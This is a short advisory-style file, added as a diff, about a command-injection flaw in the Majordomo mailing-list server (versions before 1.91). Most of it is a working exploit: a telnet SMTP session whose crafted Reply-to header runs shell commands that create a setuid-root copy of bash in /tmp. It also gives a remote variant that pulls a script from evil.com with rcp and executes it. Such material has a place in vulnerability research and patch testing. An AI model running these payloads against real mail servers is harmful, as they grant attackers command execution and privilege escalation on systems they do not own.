@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/2310/info
+
+Majordomo is a perl-based Internet e-mail list server. Versions prior to 1.91 are vulnerable to an attack whereby specially crafted e-mail headers are incorrectly processed, yielding the ability to execute arbitrary commands with the privileges of Majordomo. This is possible only when "advertise" or "noadvertise" directives are specified in the configuration files. 
+
+Local exploit:
+--exploit--
+telnet localhost 25
+
+helo localhost
+mail from: user
+rcpt to: majordomo (or whatever the name of the majordomo user is)
+data
+From: user
+To: majordomo
+Reply-to: a~.`/bin/cp\${IFS}/bin/bash\${IFS}/tmp/lord&&/bin/chmod\${IFS}4777\${IFS}/tmp/lord`.q~a/ad=cucu/c=blu\\\@kappa.ro
+
+LISTS
+.
+quit
+--end of exploit --
+
+For the remote users, change the Reply-to field to something like:
+
+Reply-to: a~.`/usr/bin/rcp\${IFS}user@evil.com:script\${IFS}/tmp/script&&source\${IFS}/tmp/script`.q~a/ad=cucu/c=blu\\\@kappa.ro 
